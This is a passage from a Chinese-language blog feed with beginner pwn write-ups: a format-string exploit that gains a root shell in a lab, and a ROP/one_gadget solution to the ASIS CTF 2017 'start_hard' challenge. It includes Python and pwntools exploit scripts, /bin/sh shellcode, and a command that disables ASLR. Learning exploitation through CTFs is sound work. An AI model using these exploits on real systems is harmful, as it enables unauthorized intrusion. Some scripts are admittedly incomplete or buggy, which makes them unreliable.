class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">fmtstr</span><span class=\"params\">(<span class=\"type\">char</span> *str)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *framep;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *ret;</span><br><span class=\"line\">\t<span class=\"keyword\">asm</span>(<span class=\"string\">&quot;movl %%ebp,%0&quot;</span> : <span class=\"string\">&quot;=r&quot;</span> (framep));</span><br><span class=\"line\">\tret = framep +<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;the address of the input array: 0x%.8x\\n&quot;</span>,(<span class=\"type\">unsigned</span>)str);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;the value of the frame pointer: 0x%.8x\\n&quot;</span>,(<span class=\"type\">unsigned</span>)framep);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;the value of the return address: 0x%.8x\\n&quot;</span>,*ret);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(str);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;the value of the return address: 0x%.8x\\n&quot;</span>,*ret);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span> **argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tFILE *badfile;</span><br><span class=\"line\">\t<span class=\"type\">char</span> str[<span class=\"number\">200</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\tbadfile = fopen(<span class=\"string\">&quot;badfile&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">\tfread(str,<span class=\"keyword\">sizeof</span>(<span class=\"type\">char</span>),<span class=\"number\">200</span>,badfile);</span><br><span class=\"line\">\tfmtstr(str);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>编译:gcc -m32 -z execstack -o fmtvul fmtvul.c</p>\n<p>echo $(printf “\\xaa\\xaa\\xaa\\xaa”).%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x &gt; badfile</p>\n<p>和书上的不太一样,这里是第22个,不对,是第21个,第一个是”\\xaa\\xaa\\xaa\\xaa”这个,不算,所以%.8x是输出了20个后到了aaaaaaaa.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings/shell# ./fmtvul</span><br><span class=\"line\">the address of the input <span class=\"built_in\">array</span>: <span class=\"number\">0xffffd514</span></span><br><span class=\"line\">the value of the frame pointer: <span class=\"number\">0xffffd4e8</span></span><br><span class=\"line\">the value of the <span class=\"keyword\">return</span> address: <span class=\"number\">0x565556fd</span></span><br><span class=\"line\">����<span class=\"number\">.565556</span>fd<span class=\"number\">.00000000</span><span class=\"number\">.565555f</span>9<span class=\"number\">.5655583</span>c<span class=\"number\">.56555839</span>.ffffd4e8.ffffd4ec.f7fbd000<span class=\"number\">.56556f</span>cc.ffffd5e8<span class=\"number\">.565556f</span>d.ffffd514<span class=\"number\">.00000001</span><span class=\"number\">.000000</span>c8<span class=\"number\">.56558160</span>.f7ffdc30<span class=\"number\">.00000200</span><span class=\"number\">.00000400</span>.ffffd694<span class=\"number\">.56558160</span>.aaaaaaaa<span class=\"number\">.382e252</span>e<span class=\"number\">.2e252</span>e78<span class=\"number\">.252e7838</span><span class=\"number\">.2e78382</span>e<span class=\"number\">.78382e25</span><span class=\"number\">.382e252</span>e<span class=\"number\">.2e252</span>e78<span class=\"number\">.252e7838</span><span class=\"number\">.2e78382</span>e</span><br><span class=\"line\">�the value of the <span class=\"keyword\">return</span> address: <span class=\"number\">0x565556fd</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>返回地址 0xffffd4e8 + 0x4 &#x3D; 0xffffd4ec</p>\n<p>实验中跳转到str数组偏移量0x90的地方, 0xffffd514 +0x90 &#x3D; 0xffffd5a4</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = (</span><br><span class=\"line\">        <span class=\"string\">&quot;\\x31\\xc0\\x31\\xdb\\xb0\\xd5\\xcd\\x80&quot;</span></span><br><span class=\"line\">        <span class=\"string\">&quot;\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50&quot;</span></span><br><span class=\"line\">        <span class=\"string\">&quot;\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\\x00&quot;</span></span><br><span class=\"line\">        ).encode(<span class=\"string\">&#x27;latin-1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">N = <span class=\"number\">200</span></span><br><span class=\"line\"></span><br><span class=\"line\">content = <span class=\"built_in\">bytearray</span>(<span class=\"number\">0x90</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(N))</span><br><span class=\"line\"></span><br><span class=\"line\">start = N - <span class=\"built_in\">len</span>(shellcode)</span><br><span class=\"line\">content[start:] = shellcode</span><br><span class=\"line\"></span><br><span class=\"line\">addr2 = <span class=\"number\">0xffffd3de</span></span><br><span class=\"line\">addr1 = <span class=\"number\">0xffffd3dc</span></span><br><span class=\"line\">content[<span class=\"number\">0</span>:<span class=\"number\">4</span>] = (addr1).to_bytes(<span class=\"number\">4</span>,byteorder=<span class=\"string\">&#x27;little&#x27;</span>)</span><br><span class=\"line\">content[<span class=\"number\">4</span>:<span class=\"number\">8</span>] = (<span class=\"string\">&quot;@@@@&quot;</span>).encode(<span class=\"string\">&#x27;latin-1&#x27;</span>)</span><br><span class=\"line\">content[<span class=\"number\">8</span>:<span class=\"number\">12</span>] = (addr2).to_bytes(<span class=\"number\">4</span>,byteorder=<span class=\"string\">&#x27;little&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">small = <span class=\"number\">0xd484</span> - <span class=\"number\">12</span> -<span class=\"number\">15</span>*<span class=\"number\">8</span></span><br><span class=\"line\">large = <span class=\"number\">0xffff</span> - <span class=\"number\">0xd484</span></span><br><span class=\"line\">s = <span class=\"string\">&quot;%.8x&quot;</span>*<span class=\"number\">15</span> + <span class=\"string\">&quot;%.&quot;</span> + <span class=\"built_in\">str</span>(small) + <span class=\"string\">&quot;x%hn%.&quot;</span> + <span class=\"built_in\">str</span>(large) +<span class=\"string\">&quot;x%hn&quot;</span></span><br><span class=\"line\">fmt = (s).encode(<span class=\"string\">&#x27;latin-1&#x27;</span>)</span><br><span class=\"line\">content[<span class=\"number\">12</span>:<span class=\"number\">12</span>+<span class=\"built_in\">len</span>(fmt)] = fmt</span><br><span class=\"line\"></span><br><span class=\"line\">file=<span class=\"built_in\">open</span>(<span class=\"string\">&quot;badfile&quot;</span>,<span class=\"string\">&quot;wb&quot;</span>)</span><br><span class=\"line\">file.write(content)</span><br><span class=\"line\">file.close()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">                                               ̀the value of the <span class=\"keyword\">return</span> address: <span class=\"number\">0xffffd4ec</span></span><br><span class=\"line\">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>\n\n<p>地址修改对了,但还是报错了,和libc版本有关系?还是需要去除保护?-fno-stack-protector</p>\n<p>the address of the input array: 0xffffd514<br>the value of the frame pointer: 0xffffd4f8</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings/shell# ./fmtvul</span><br><span class=\"line\">the address of the input <span class=\"built_in\">array</span>: <span class=\"number\">0xffffd544</span></span><br><span class=\"line\">the value of the frame pointer: <span class=\"number\">0xffffd528</span></span><br><span class=\"line\">the value of the <span class=\"keyword\">return</span> address: <span class=\"number\">0x56555691</span></span><br><span class=\"line\">����<span class=\"number\">.56555691</span><span class=\"number\">.00000000</span><span class=\"number\">.565555</span>a9<span class=\"number\">.565557</span>ac<span class=\"number\">.565557</span>a9.ffffd52c.ffffd528.f7fbd000<span class=\"number\">.56556f</span>d0.ffffd618<span class=\"number\">.56555691</span>.ffffd544<span class=\"number\">.00000001</span><span class=\"number\">.000000</span>c8<span class=\"number\">.56558160</span><span class=\"number\">.00000000</span>.aaaaaaaa<span class=\"number\">.382e252</span>e<span class=\"number\">.2e252</span>e78<span class=\"number\">.252e7838</span><span class=\"number\">.2e78382</span>e<span class=\"number\">.78382e25</span><span class=\"number\">.382e252</span>e<span class=\"number\">.2e252</span>e78<span class=\"number\">.252e7838</span><span class=\"number\">.2e78382</span>e<span class=\"number\">.78382e25</span><span class=\"number\">.382e252</span>e<span class=\"number\">.2e252</span>e78<span class=\"number\">.252e7838</span></span><br><span class=\"line\">�the value of the <span class=\"keyword\">return</span> address: <span class=\"number\">0x56555691</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>问题出在了这里,在我们这里编译的时候,是第17个位置存储着str数组,和书上不一样,<font color=\"red\">这可能和编译器版本等有关,所以还是要具体问题具体分析,看懂了书里的,然后在实际操作中根据实际情况动态修改一些东西才可以</font></p>\n<p>从root用户切换到ubuntu也会改变一些东西,地址也变了</p>\n<p>the address of the input array: 0xffffd3f4                0xffffd3f4 + 0x90 &#x3D; 0xffffd484<br>the value of the frame pointer: 0xffffd3d8<br>the value of the return address: 0x5655569</p>\n<p>修改exp里面对应的地址和%x的个数,然后就可以了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00000000000000000000000000000000000040404040</span>�������������������������������������������������������������������������<span class=\"number\">1</span>�<span class=\"number\">1</span>۰�̀<span class=\"number\">1</span>�Ph<span class=\"comment\">//shh/bin��PS�ᙰ</span></span><br><span class=\"line\">                                                               ̀the value of the <span class=\"keyword\">return</span> address: <span class=\"number\">0xffffd484</span></span><br><span class=\"line\"><span class=\"meta\"># id</span></span><br><span class=\"line\">uid=<span class=\"number\">0</span>(root) gid=<span class=\"number\">500</span>(ubuntu) groups=<span class=\"number\">500</span>(ubuntu),<span class=\"number\">4</span>(adm),<span class=\"number\">24</span>(cdrom),<span class=\"number\">27</span>(sudo),<span class=\"number\">30</span>(dip),<span class=\"number\">46</span>(plugdev),<span class=\"number\">113</span>(lpadmin),<span class=\"number\">114</span>(sambashare)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<p>%n$x 表示格式字符串后的第n个数据</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-4-one-gadget/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-4-one-gadget/",
            "title": "pwn入门-4-one_gadget",
            "date_published": "2022-12-05T14:51:11.000Z",
            "content_html": "<p>未完待续: exp有问题…</p>\n<p>题目来源:asis ctf quals 2017:start hard</p>\n<p><a href=\"https://github.com/boslash/bo8/tree/master/start_hard\">https://github.com/boslash/bo8/tree/master/start_hard</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall main(<span class=\"built_in\">int</span> a1, char **a2, char **a3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char buf[<span class=\"number\">16</span>]; // [rsp+10h] [rbp-10h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, 0x400uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> 0LL;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>用ida查看反汇编代码,一个很明显的缓冲区溢出漏洞,要看开启了什么保护,没有canary,栈好利用一些,但是开了nx,所以得用rop之类的</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/tmp/starthard/start_hard&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-<span class=\"number\">64</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (<span class=\"number\">0x400000</span>)</span><br></pre></td></tr></table></figure>\n\n<p>用one_gadget看有没有</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-<span class=\"number\">24</span>-<span class=\"number\">10</span>-ubuntu:/tmp/starthard<span class=\"comment\"># one_gadget ./libc.so.6 </span></span><br><span class=\"line\"><span class=\"number\">0x4526a</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x30</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x30</span>] == NULL</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xef6c4</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x50</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x50</span>] == NULL</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xf0567</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x70</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x70</span>] == NULL</span><br><span class=\"line\">gef➤  telescope</span><br><span class=\"line\"><span class=\"number\">0x007fffffffe460</span>│+<span class=\"number\">0x0000</span>: <span class=\"number\">0x007fffffffe568</span>  →  <span class=\"number\">0x007fffffffe7be</span>  →  <span class=\"string\">&quot;/tmp/starthard/start_hard&quot;</span>\t ← $rsp</span><br><span class=\"line\"><span class=\"number\">0x007fffffffe468</span>│+<span class=\"number\">0x0008</span>: <span class=\"number\">0x0000000100400430</span></span><br><span class=\"line\"><span class=\"number\">0x007fffffffe470</span>│+<span class=\"number\">0x0010</span>: <span class=\"number\">0x6161616161616161</span>\t ← $rsi</span><br><span class=\"line\"><span class=\"number\">0x007fffffffe478</span>│+<span class=\"number\">0x0018</span>: <span class=\"number\">0x6161616161616161</span></span><br><span class=\"line\"><span class=\"number\">0x007fffffffe480</span>│+<span class=\"number\">0x0020</span>: <span class=\"number\">0x6161616161616161</span>\t ← $rbp</span><br><span class=\"line\"><span class=\"number\">0x007fffffffe488</span>│+<span class=\"number\">0x0028</span>: <span class=\"number\">0x007ffff7a03c0a</span>  →  &lt;__libc_start_main+<span class=\"number\">106</span>&gt; mov rsi, QWORD PTR [rsp+<span class=\"number\">0x8</span>]</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t溢出24字节,然后加上0x4526a即可,但是一直打失败了…是因为libc的问题吧,需要链接上 或者用本地的</p>\n<p>​\t\t0x4526a这个地址行吗???,这个地址是什么地址?? </p>\n<p>2023 7 28: \t\t感觉思路没啥问题呀… 是不是可以爆破,是加了随机化是吗… 哦对…是libc中的one_gadget呀..那肯定加了随机化…</p>\n<p>随机化了三个字符, 所以能怎么输入呢?</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exploit</span>():</span><br><span class=\"line\">    p = process(<span class=\"string\">&quot;./start_hard&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    payload = <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">24</span> + p16(<span class=\"number\">0xeafe</span>) + p8(<span class=\"number\">0x23</span>)</span><br><span class=\"line\">    p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Add some delay after each attempt to avoid rapid execution issues</span></span><br><span class=\"line\">    time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Read the output from the process</span></span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Check if the exploit was successful and print the result</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">b&quot;Flag&quot;</span> <span class=\"keyword\">in</span> response:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] Exploit successful! Flag:&quot;</span>, response.split(<span class=\"string\">b&quot;\\n&quot;</span>)[-<span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] Exploit failed.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Number of attempts you want to perform</span></span><br><span class=\"line\">num_attempts = <span class=\"number\">100</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num_attempts):</span><br><span class=\"line\">    exploit()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-4-one-gadget/image-20231116210352866.png\" alt=\"image-20231116210352866\"></p>\n<p>在之前发送命令就可以!!</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-4-one-gadget/image-20230729095606345.png\" alt=\"image-20230729095606345\"></p>\n<p>把回车重定向进去就可以了把</p>\n<p>python3 final.py &lt; huiche &gt; tmp</p>\n<h1 id=\"问题来源-不知道libc的加载基地址\"><a href=\"#问题来源-不知道libc的加载基地址\" class=\"headerlink\" title=\"问题来源:不知道libc的加载基地址\"></a>问题来源:不知道libc的加载基地址</h1><p>​\t\t需要解决如何获得libc基址,但是刚才用vmmap查看,然后相加了呀,为啥不行呢?就算可以,对方是远程的,所以这样应该不行…应该需要先打印出来?</p>\n<p>​\t\t不是的,它是因为开了PIE,会有随机化,每次地址都会变</p>\n<p>​\t\t</p>\n<h2 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h2><p>​\t\tlibc中的各种函数的相对地址是固定的,按照往常套路,我们需要先泄露出一个函数的地址,然后计算偏移,但是在本题中没法进行泄露(或许可以????)</p>\n<p>​\t\t题解给的办法是,因为我们有read函数,可以利用它和onegadget的偏移,通过爆破?寻找onegadget,直接把read的got表给修改了成onegadget的,然后再次进行调用read就是调用onegadget了,就可以getshell了<br>​\t\t所以思路应该是通过栈溢出构造gadget链子,先利用read函数,把read的got表改成onegadget的,然后返回main函数重新执行即可</p>\n<h2 id=\"构造payload\"><a href=\"#构造payload\" class=\"headerlink\" title=\"构造payload\"></a>构造payload</h2><p>​\t<strong>ssize_t read(int</strong> <em>fd</em><strong>, void buf</strong><em>, size_t</em>* <em>count</em>**); read函数的含义是,从fd中读取count数据,写入到buf中,</p>\n<p>​\t\t问题是怎么构造read呢? 首先我们知道read的符号地址,可以直接进行调用,然后通过寄存器设置参数, count是不是可以不用设置??<br>寻找pop rsi的gadget,传入read的got地址到buf变量,然后设置fd为onegadget的地址,然后最后将返回地址设置为main的就可以了!</p>\n<h2 id=\"关于onegadget地址的传参问题\"><a href=\"#关于onegadget地址的传参问题\" class=\"headerlink\" title=\"关于onegadget地址的传参问题\"></a>关于onegadget地址的传参问题</h2><p>​\t\t但是问题是题解中的onegadget的地址是直接传参传进来的,不是通过设置rdi,这是为啥呢???<br>​\t\t是因为此时rdi为0,所以从标准输入中获取嘛?我觉得应该是,并且这个让我想到了pwnable的第一题…那应该就不奇怪了</p>\n<h2 id=\"关于onegadget-用的libc的问题\"><a href=\"#关于onegadget-用的libc的问题\" class=\"headerlink\" title=\"关于onegadget 用的libc的问题\"></a>关于onegadget 用的libc的问题</h2><p>​\t\t用的如果是自己的libc的话,</p>\n<p>readelf -s &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 | grep read@</p>\n<p>ROPgadget –binary &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 –only ‘pop|ret’</p>\n<p>0x000000000002164d : pop rsi ; pop r15 ; ret</p>\n<p>echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>\n<h1 id=\"最终exp\"><a href=\"#最终exp\" class=\"headerlink\" title=\"最终exp\"></a>最终exp</h1><p>​\t\t这是作者给的原exp,实际上用的话可能需要简单修改</p>\n<p>​\t\t该exp首先填满缓冲区,然后通过 pop_rsi把read的got表地址赋值给rsi,即后面read的第二个参数buf,也就是我们要覆盖的地址,后面8个A是因为用的gadget多了一个pop r15,填入个垃圾数据就可以了. 然后pop完之后继续往下执行,执行到read的symbols,也就是去执行read函数,此时read还没有第一个参数fd,也就是从哪里读取,但是在调试的时候发现rdi是0,也就是从标准输入读取.不过为什么那么巧,rdi是0呢???万一不是0呢? 如果不是0的话,就需要gadget进行布置了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./start_hard&#x27;</span>)</span><br><span class=\"line\">pop_rsi = <span class=\"number\">0x004005c1</span>\t\t\t\t\t<span class=\"comment\"># pop rsi; pop r15; ret</span></span><br><span class=\"line\">one_gadget = <span class=\"number\">0x1147</span>\t\t\t\t\t<span class=\"comment\"># 0xf1147</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">\tpayload  = <span class=\"string\">&quot;A&quot;</span>*(<span class=\"number\">0x10</span> + <span class=\"number\">8</span>)</span><br><span class=\"line\">\tpayload += p64(pop_rsi) + p64(elf.got[<span class=\"string\">&#x27;read&#x27;</span>]) + <span class=\"string\">&quot;A&quot;</span>*<span class=\"number\">8</span></span><br><span class=\"line\">\tpayload += p64(elf.symbols[<span class=\"string\">&#x27;read&#x27;</span>])</span><br><span class=\"line\">\tpayload += p64(<span class=\"number\">0x0040044d</span>)\t\t<span class=\"comment\"># call __libc_start_main</span></span><br><span class=\"line\">\tpayload  = payload.ljust(<span class=\"number\">0x400</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\tio.send(payload)</span><br><span class=\"line\">\tio.send(p16(one_gadget))</span><br><span class=\"line\">\tio.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\tio = remote(<span class=\"string\">&#x27;0.0.0.0.&#x27;</span>, <span class=\"number\">10001</span>)\t\t</span><br><span class=\"line\">    <span class=\"comment\"># io = process(&#x27;./start_hard&#x27;)</span></span><br><span class=\"line\">\tpwn()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n<h1 id=\"其他需要储备的知识-问题\"><a href=\"#其他需要储备的知识-问题\" class=\"headerlink\" title=\"其他需要储备的知识 + 问题\"></a>其他需要储备的知识 + 问题</h1><h3 id=\"64位传参\"><a href=\"#64位传参\" class=\"headerlink\" title=\"64位传参\"></a>64位传参</h3><p>和32位 不同的是,要用到寄存器: rdi rsi rdx rcx </p>\n<h3 id=\"关于read函数\"><a href=\"#关于read函数\" class=\"headerlink\" title=\"关于read函数\"></a>关于read函数</h3><p><a href=\"https://man7.org/linux/man-pages/man2/read.2.html\">https://man7.org/linux/man-pages/man2/read.2.html</a></p>\n<h3 id=\"关于下断点调试分析\"><a href=\"#关于下断点调试分析\" class=\"headerlink\" title=\"关于下断点调试分析\"></a>关于下断点调试分析</h3><p>​\t\t\t可以在call _read指令后面下断点,然后一点点调试分析</p>\n<p>​\t\t一直以来都犯了一个错误,觉得下断点应该在exp中用pause(),但是一直不知道怎么在payload打出去后,断下来,应该及时和同学交流的,这个问题的答案其实自己早就知道了,只是不知道原来是这样…</p>\n<p>​\t\tgdb.attach(io,”b __libc_start_main”) 其实就是这句, gdb attach的话下个断点就可以了,这样就可以在payload打之后一点点调试了</p>\n<p><a 